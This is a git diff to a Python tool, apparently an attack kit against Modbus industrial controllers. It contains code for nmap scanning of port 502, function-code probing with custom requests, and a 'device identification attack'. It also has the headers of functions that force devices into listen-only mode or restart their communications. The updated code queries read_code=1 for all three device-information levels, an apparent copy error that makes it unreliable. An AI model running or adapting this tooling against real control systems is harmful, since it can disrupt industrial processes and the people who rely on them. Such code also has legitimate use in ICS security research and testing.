@@ -10,8 +10,9 @@ import random
 import numpy as np
 from time import sleep
 from threading import Thread
-from pymodbus.client import ModbusTcpClient, ModbusSerialClient
-from pymodbus.pdu import ModbusRequest
+from pymodbus.client.sync import ModbusTcpClient, ModbusSerialClient
+from pymodbus.mei_message import ReadDeviceInformationRequest
+from pymodbus.pdu import ModbusRequest, ExceptionResponse
 
 # constants
 LOGO = r"""
@@ -22,11 +23,15 @@ LOGO = r"""
                                                    |__/                                                                                             
 """
 
+
+
+# CLASS:    CustomModbusRequest
+# PURPOSE:  A subclass of the ModbusRequest class. Used to construct
+#           custom modbus requests.
 class CustomModbusRequest(ModbusRequest):
-    def __init__(self, fc, custom_data=b'', **kwargs):
+    def __init__(self, custom_data=b'', **kwargs):
         ModbusRequest.__init__(self, **kwargs)
         self.custom_data = custom_data
-        self.function_code = fc
 
     def encode(self):
         return self.custom_data
@@ -34,6 +39,10 @@ class CustomModbusRequest(ModbusRequest):
     def decode(self, data):
         self.custom_data = data
 
+
+
+# FUNCTION: create_custom_request
+# PURPOSE:  Factory method for creating custom modbus request with specfied function codes.
 def create_custom_request(fc):
     class DynamicRequest(CustomModbusRequest):
         pass
@@ -41,10 +50,11 @@ def create_custom_request(fc):
     return DynamicRequest
 
 
-# Function: address_scan
-# Purpose: Performs an address scan on the given network in CIDR format. The
-#   scan identifies hosts running with port 502 open, as this port is used for Modbus
-#   TCP communication.
+
+# FUNCTION: address_scan
+# PURPOSE:  Performs an address scan on the given network in CIDR format. The
+#           scan identifies hosts running with port 502 open, as this port is used for Modbus
+#           TCP communication.
 def address_scan(ip_CIDR):
     print("### ADDRESS SCAN ###")
     print(f"Performing an nmap ip scan on network {ip_CIDR} on port 502")
@@ -74,9 +84,11 @@ def address_scan(ip_CIDR):
 
     print("### ADDRESS SCAN FINISH ###")
 
-# Function: function_code_scan
-# Purpose: Scans all valid function codes for a list a specified Modbus clients, checking if
-#   the function codes work.
+
+
+# FUNCTION: function_code_scan
+# PURPOSE:  Scans all valid function codes for a list a specified Modbus clients, checking if
+#           the function codes work.
 def function_code_scan(ip_addresses):
     publicFC = {1,2,3,4,5,6,7,8,11,12,15,16,17,20,21,22,23,24,43}
     userDefFC = {65,66,67,68,69,70,71,72,100,101,102,103,104,105,106,107,108,109,110}
@@ -86,7 +98,6 @@ def function_code_scan(ip_addresses):
     print("### FUNCTION CODE SCAN ###")
 
     # scan ips (Modbus TCP)
-    # TODO: find a way to make a custom modbus packet in pymodbus
     for ip in ip_addresses:
         print(f"===== Performing a function code scan IP {ip} =====")
         print()
@@ -104,30 +115,35 @@ def function_code_scan(ip_addresses):
                 # send custom pdu request
                 CustomFunctionCode = create_custom_request(fc)
                 request = CustomFunctionCode(custom_data=b'\x00\x00\x00\x00')
-                response = client.execute(request=request)
-
-                print(response)
-
-                # check if exception occurred
-                if response == None:
-                    # check if an illegal function error occurred (means the modbus client doesn't accept the fc)
-                    #if client.last_except != 1:
-                    print(f"Acception function code {fc}")
-                else:
-                    print(f"Accepted function code {fc}")
+                
+                try:
+                    response = client.execute(request)
+                    if isinstance(response, ExceptionResponse):
+                        # check if an illegal function exception (0x01) has occurred
+                        if response.exception_code != 1:
+                            print(f"Function code {fc} accepted with exception {response.exception_code}")
+                    #elif response is None:
+                    #    print(f"Function Code {fc}: No response / timeout")
+                    else:
+                        print(f"Function Code {fc} accepted")
+                except Exception as e:
+                    print(f"Function Code {fc} accepted with an error")
         print()
         client.close()
     print("### FUNCTION CODE SCAN FINISH ###")
 
-# Function: device_identification_attack
-# Purpose: Uses function code 0x2B to attempt to find device information.
+
+
+# FUNCTION: device_identification_attack
+# PURPOSE:  Uses function code 0x2B to attempt to find device information.
 def device_identification_attack(ip_addresses):
     print("### DEVICE IDENTIFICATION ATTACK ###")
 
     for ip in ip_addresses:
         print(f"===== Performing device identification on {ip} =====")
-        client = ModbusClient(host=ip, port=502)
-        response = client.read_device_identification(read_code=1)
+        client = ModbusTcpClient(host=ip, port=502)
+        request = ReadDeviceInformationRequest(read_code=1)
+        response = client.execute(request=request)
 
         # check if device identification is possible
         if response == None:
@@ -135,22 +151,27 @@ def device_identification_attack(ip_addresses):
         else:
             # extract data from all object types
             print("*** Basic object type data: ***")
-            response = client.read_device_identification(read_code=1)
-            for i in response.objects_by_id:
-                print(response.objects_by_id.get(i))
+            request = ReadDeviceInformationRequest(read_code=1)
+            response = client.execute(request=request)
+            for k, v in response.information.items():
+                print(f"  {k}: {v}")
 
             print("*** Regular object type data: ***")
-            response = client.read_device_identification(read_code=2)
-            for i in response.objects_by_id:
-                print(response.objects_by_id.get(i))
+            request = ReadDeviceInformationRequest(read_code=1)
+            response = client.execute(request=request)
+            for k, v in response.information.items():
+                print(f"  {k}: {v}")
 
             print("*** Extended object type data: ***")
-            response = client.read_device_identification(read_code=3)
-            for i in response.objects_by_id:
-                print(response.objects_by_id.get(i))
+            request = ReadDeviceInformationRequest(read_code=1)
+            response = client.execute(request=request)
+            for k, v in response.information.items():
+                print(f"  {k}: {v}")
         print()
         client.close()
     print("### DEVICE IDENTIFICATION ATTACK FINISH ###")
+
+
 
 # Function: force_listen_mode
 # Purpose: Sends function code 0x08 with sub-function code 0x0004
@@ -175,6 +196,8 @@ def force_listen_mode(ip_addresses):
         client.close()
 
     print("### FORCE LISTEN MODE FINISH ###")
+
+
 
 # Function: restart_communication
 # Purpose: Sends function code 0x08 with sub-function code 0x0001
